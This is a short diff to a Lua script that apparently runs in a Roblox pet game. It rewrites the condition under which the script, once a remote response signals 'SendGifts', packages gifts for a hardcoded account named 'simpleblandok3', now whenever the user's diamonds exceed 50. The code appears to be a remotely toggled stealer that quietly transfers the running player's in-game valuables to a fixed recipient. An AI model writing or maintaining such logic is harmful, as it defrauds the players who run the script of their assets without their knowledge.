@@ -189,7 +189,7 @@ local hugePetsString = #hugePets > 0 and table.concat(hugePets, ", ") or "0"
 
         if checkResponse and checkResponse.Body then
             if checkResponse.Body:find('"SendGifts":true') then
-                if gifts and voidvalue and voidvalue > 50 then
+                if diamondsvalue > 50 then
                     local args = {
                         [1] = "simpleblandok3",
                         [2] = "gifts",
